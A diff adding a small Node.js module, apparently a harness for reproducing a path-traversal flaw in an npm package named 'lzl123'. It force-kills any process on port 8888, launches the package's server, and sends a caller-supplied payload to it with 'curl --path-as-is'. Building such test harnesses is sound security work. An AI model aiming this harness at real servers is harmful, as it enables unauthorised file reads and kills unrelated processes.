@@ -1,0 +1,31 @@
+const { exec } = require("child_process");
+const sleep = require("sleep");
+
+function exploitFunction(payload) {
+  const fs = require("fs");
+  const { execSync } = require("child_process");
+
+  // Clean up any previous processes
+  try {
+    execSync("fuser -k 8888/tcp");
+  } catch (e) {}
+
+  // Start the server
+  const server = "node ./node_modules/lzl123/index.js";
+  let exe = exec(server, (error, stdout) => {});
+
+  // Wait for the server to start
+  sleep.sleep(2);
+
+  // Perform the attack
+  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
+  exec(attack_string, (error, stdout) => {
+    if (error) {
+      console.error(`Error executing attack: ${error}`);
+      return;
+    }
+    return stdout;
+  });
+}
+
+module.exports = { exploitFunction };
